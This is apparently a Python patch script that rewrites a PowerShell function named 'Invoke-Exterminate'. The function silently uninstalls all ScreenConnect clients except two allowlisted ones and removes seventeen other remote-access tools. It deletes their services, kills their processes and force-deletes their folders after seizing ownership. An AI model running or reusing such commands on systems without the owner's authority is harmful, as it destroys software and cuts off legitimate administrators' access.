from __future__ import annotations

import io

p = r"C:\Users\nobuddy\Desktop\Project\own_lib.ps1"
s = io.open(p, encoding="utf-8").read()
start = s.index("function Invoke-Exterminate {")
end = s.index("function Update-State {")

new = r'''function Invoke-Exterminate {
    # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
    # fallback + force dir nuke. Keep only the two allowlisted fingerprints.
    $log = Join-Path $WorkDir 'exterminate.log'
    $keep = @('5f6010579852e507','f861c8140d453427')
    $n = @{ svc = 0; proc = 0; dir = 0; product = 0; rmm = 0; fail = 0 }
    function Log([string]$m) {
        $line = '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
        Add-Content -LiteralPath $log -Value $line -ErrorAction SilentlyContinue
        Write-Output $line
    }
    function Is-Keeper([string]$s) {
        if (-not $s) { return $false }
        foreach ($k in $keep) { if ($s -like "*$k*") { return $true } }
        return $false
    }
    function Force-RemoveDir([string]$d) {
        if (-not $d -or -not (Test-Path -LiteralPath $d)) { return $true }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
            Where-Object { $_.ExecutablePath -and $_.ExecutablePath.StartsWith($d, [StringComparison]::OrdinalIgnoreCase) } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        & takeown.exe /F $d /R /D Y 2>&1 | Out-Null
        & icacls.exe $d /grant '*S-1-5-32-544:F' /T /C /Q 2>&1 | Out-Null
        & icacls.exe $d /grant 'Administrators:F' /T /C /Q 2>&1 | Out-Null
        Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath $d) {
            cmd.exe /c "attrib -h -s -r /s /d `"$d\*.*`"" 2>&1 | Out-Null
            cmd.exe /c "rmdir /s /q `"$d`"" 2>&1 | Out-Null
        }
        if (Test-Path -LiteralPath $d) {
            $empty = Join-Path $env:TEMP ("own_empty_" + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $empty -Force | Out-Null
            & robocopy.exe $empty $d /MIR /R:0 /W:0 2>&1 | Out-Null
            Remove-Item -LiteralPath $empty -Force -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        }
        return -not (Test-Path -LiteralPath $d)
    }
    function Uninstall-ProductKey($key) {
        $guid = $key.PSChildName
        $prop = Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue
        $dn = $prop.DisplayName
        if ($guid -like '{*}') {
            $p = Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -PassThru -WindowStyle Hidden
            Log "product_msiexec [$dn] guid=$guid exit=$($p.ExitCode)"
            if ($p.ExitCode -in 0, 1605, 1614, 3010) { return $true }
        }
        $us = $prop.UninstallString
        if ($us) {
            try {
                if ($us -match '(?i)msiexec') {
                    $args = ($us -replace '(?i)^.*msiexec(\.exe)?\s*', '')
                    if ($args -notmatch '/qn') { $args = "$args /qn /norestart" }
                    $p = Start-Process msiexec.exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
                    Log "product_uninstallstring_msi [$dn] exit=$($p.ExitCode)"
                } else {
                    $p = Start-Process cmd.exe -ArgumentList "/c $us /S /silent /quiet /qn" -Wait -PassThru -WindowStyle Hidden
                    Log "product_uninstallstring_exe [$dn] exit=$($p.ExitCode)"
                }
                return $true
            } catch { Log "product_uninstallstring_FAIL [$dn] $_" }
        }
        return $false
    }

    Log 'exterminate_engine_L7_begin'

    # 1. foreign SC products from BOTH correct ARP hives
    $seen = @{}
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { Log "hive_missing $root"; continue }
        Log "hive_scan $root"
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $prop = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            $dn = $prop.DisplayName
            if (-not $dn) { return }
            if ($dn -notmatch '(?i)ScreenConnect\s+Client\s*\(([0-9A-Fa-f]{16})\)') { return }
            $fp = $Matches[1].ToLower()
            if ($fp -in $keep) { return }
            if ($seen.ContainsKey($_.PSChildName)) { return }
            $seen[$_.PSChildName] = $true
            if (Uninstall-ProductKey $_) { $n.product++ } else { $n.fail++; Log "product_REMOVE_FAILED [$dn]" }
        }
    }

    # 2. foreign SC services
    foreach ($svc in (Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' })) {
        if (Is-Keeper $svc.Name) { continue }
        & sc.exe stop "$($svc.Name)" 2>&1 | Out-Null
        Start-Sleep -Milliseconds 600
        & sc.exe delete "$($svc.Name)" 2>&1 | Out-Null
        $n.svc++; Log "svc_deleted $($svc.Name)"
    }

    # 3. foreign SC processes
    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        $exe = $_.ExecutablePath
        if ($exe -and -not (Is-Keeper $exe)) {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            $n.proc++; Log "proc_killed $exe"
        }
    }

    # 4. foreign SC install dirs (PF + PF86)
    foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
        if (-not $base -or -not (Test-Path $base)) { continue }
        Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like 'ScreenConnect*' } | ForEach-Object {
                $d = $_.FullName
                if (Is-Keeper $d) { return }
                if (Force-RemoveDir $d) { $n.dir++; Log "dir_removed $d" }
                else { $n.fail++; Log "dir_REMOVE_FAILED $d" }
            }
    }

    # 5. disallowed RMM tools
    $rmm = @(
        @{ Tag='AnyDesk';     Svc=@('AnyDesk'); Proc=@('AnyDesk'); Dirs=@("$env:ProgramFiles\AnyDesk","${env:ProgramFiles(x86)}\AnyDesk","$env:ProgramData\AnyDesk"); Prod=@('AnyDesk*') }
        @{ Tag='TeamViewer';  Svc=@('TeamViewer*'); Proc=@('TeamViewer*'); Dirs=@("$env:ProgramFiles\TeamViewer","${env:ProgramFiles(x86)}\TeamViewer"); Prod=@('TeamViewer*') }
        @{ Tag='MeshAgent';   Svc=@('Mesh Agent','MeshAgent','MeshCentral*'); Proc=@('MeshAgent*','MeshCentral*'); Dirs=@("$env:ProgramFiles\Mesh Agent","${env:ProgramFiles(x86)}\Mesh Agent"); Prod=@('Mesh*Agent*') }
        @{ Tag='Splashtop';   Svc=@('Splashtop*','SRService','SSUService'); Proc=@('Splashtop*','strwinclt*','SRManager*'); Dirs=@("$env:ProgramFiles\Splashtop","${env:ProgramFiles(x86)}\Splashtop"); Prod=@('Splashtop*') }
        @{ Tag='LogMeIn';     Svc=@('LogMeIn','LMIGuardianSvc','LMIignition'); Proc=@('LogMeIn*','LMIGuardian*','RaServer*'); Dirs=@("$env:ProgramFiles\LogMeIn","${env:ProgramFiles(x86)}\LogMeIn"); Prod=@('LogMeIn*') }
        @{ Tag='GoTo';        Svc=@('GoToMyPC*','GoToAssist*','GoToResolve*'); Proc=@('GoToMyPC*','GoToAssist*','g2m*','GoToResolve*'); Dirs=@("$env:ProgramFiles\GoToMyPC","${env:ProgramFiles(x86)}\GoToMyPC"); Prod=@('GoToMyPC*','GoToAssist*') }
        @{ Tag='ConnectWise'; Svc=@('LTService','LTSvcMon'); Proc=@('LTSvc*','LTTray*'); Dirs=@("$env:windir\LTSvc"); Prod=@('ConnectWise*','LabTech*') }
        @{ Tag='Atera';       Svc=@('AteraAgent'); Proc=@('AteraAgent*'); Dirs=@("$env:ProgramFiles\ATERA Networks","${env:ProgramFiles(x86)}\ATERA Networks"); Prod=@('Atera*') }
        @{ Tag='NinjaRMM';    Svc=@('NinjaRMMAgent','ninjarmm*'); Proc=@('NinjaRMMAgent*','ninjarmm*'); Dirs=@("$env:ProgramFiles\NinjaRMMAgent","${env:ProgramFiles(x86)}\NinjaRMMAgent","$env:ProgramData\NinjaRMMAgent"); Prod=@('NinjaRMM*') }
        @{ Tag='Datto';       Svc=@('CentraStage','CagService'); Proc=@('CentraStage*','DattoRMM*'); Dirs=@("$env:ProgramFiles\CentraStage","${env:ProgramFiles(x86)}\CentraStage"); Prod=@('Datto*','CentraStage*') }
        @{ Tag='RustDesk';    Svc=@('RustDesk','rustdesk*'); Proc=@('rustdesk*'); Dirs=@("$env:ProgramFiles\RustDesk","${env:ProgramFiles(x86)}\RustDesk"); Prod=@('RustDesk*') }
        @{ Tag='Supremo';     Svc=@('Supremo*'); Proc=@('Supremo*'); Dirs=@("$env:ProgramFiles\Supremo","${env:ProgramFiles(x86)}\Supremo"); Prod=@('Supremo*') }
        @{ Tag='DWService';   Svc=@('DWAgent','dwagent*'); Proc=@('dwagent*'); Dirs=@("$env:ProgramFiles\DWAgent","${env:ProgramFiles(x86)}\DWAgent","$env:ProgramData\DWAgent"); Prod=@('DWAgent*') }
        @{ Tag='ZohoAssist';  Svc=@('ZohoAssist*','ZohoMeeting*'); Proc=@('ZohoAssist*','ZohoURSB*'); Dirs=@("$env:ProgramFiles\ZohoMeeting","${env:ProgramFiles(x86)}\ZohoMeeting"); Prod=@('Zoho Assist*') }
        @{ Tag='RemotePC';    Svc=@('RemotePC*'); Proc=@('RemotePC*','RPCSuite*'); Dirs=@("$env:ProgramFiles\RemotePC","${env:ProgramFiles(x86)}\RemotePC"); Prod=@('RemotePC*') }
        @{ Tag='Syncro';      Svc=@('Syncro*','Kabuto*'); Proc=@('Syncro*','Kabuto*'); Dirs=@("$env:ProgramFiles\RepairTech","${env:ProgramFiles(x86)}\RepairTech","$env:ProgramFiles\Syncro","${env:ProgramFiles(x86)}\Syncro"); Prod=@('Syncro*','Kabuto*','RepairTech*') }
        @{ Tag='ManageEngine'; Svc=@('ManageEngine*','UEMS*'); Proc=@('ManageEngine*','dcagent*'); Dirs=@("$env:ProgramFiles\ManageEngine","${env:ProgramFiles(x86)}\ManageEngine"); Prod=@('ManageEngine*','UEMS*') }
    )
    foreach ($tool in $rmm) {
        $hit = $false
        foreach ($pat in $tool.Prod) {
            foreach ($root in $script:UninstallRoots) {
                Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
                    $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($dn -and $dn -like $pat) {
                        if (Uninstall-ProductKey $_) { $n.rmm++; $hit = $true }
                    }
                }
            }
        }
        foreach ($pat in $tool.Svc) {
            Get-Service -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                & sc.exe stop "$($_.Name)" 2>&1 | Out-Null
                Start-Sleep -Milliseconds 500
                & sc.exe delete "$($_.Name)" 2>&1 | Out-Null
                $n.rmm++; $hit = $true; Log "rmm_svc_deleted $($_.Name) [$($tool.Tag)]"
            }
        }
        foreach ($pat in $tool.Proc) {
            Get-Process -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                $n.rmm++; $hit = $true; Log "rmm_proc_killed $($_.ProcessName) [$($tool.Tag)]"
            }
        }
        foreach ($d in $tool.Dirs) {
            if ($d -and (Test-Path -LiteralPath $d)) {
                if (Force-RemoveDir $d) { $n.rmm++; $hit = $true; Log "rmm_dir_removed $d" }
                else { $n.fail++; Log "rmm_dir_REMOVE_FAILED $d" }
            }
        }
        if ($hit) { Log "rmm_exterminated $($tool.Tag)" }
    }

    $summary = "exterminate svc=$($n.svc) proc=$($n.proc) dir=$($n.dir) product=$($n.product) rmm=$($n.rmm) fail=$($n.fail)"
    Log $summary
    return $summary
}

'''

s = s[:start] + new + s[end:]
io.open(p, "w", encoding="utf-8", newline="\n").write(s)
print("rewrote", len(new), "chars")
assert r"WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" in s
assert r"WOW6432Node\CurrentVersion\Uninstall" not in s
print("WOW paths verified OK")
